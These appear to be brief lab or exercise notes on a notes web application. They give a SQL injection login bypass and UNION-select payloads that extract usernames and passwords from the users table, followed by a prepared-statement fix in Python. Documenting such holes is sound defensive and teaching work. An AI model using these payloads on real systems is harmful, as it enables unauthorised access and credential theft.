# General notes
We can log in with
```sql
' or 1=1;--
```

We can get admin credentials when importing notes in the following way.
```sql
0 union select id, username, (SELECT strftime('%Y-%m-%d %H:%M:%S', datetime('now'))), username, 100000 from users
order by id asc;
0 union select id, username, (SELECT strftime('%Y-%m-%d %H:%M:%S', datetime('now'))), password, 100000 from users
order by id asc;
```

We can secure against injection using prepared statements, e.g.
```python
c.execute("SELECT * FROM users WHERE username = ? AND password = ?;", [username, password])
```
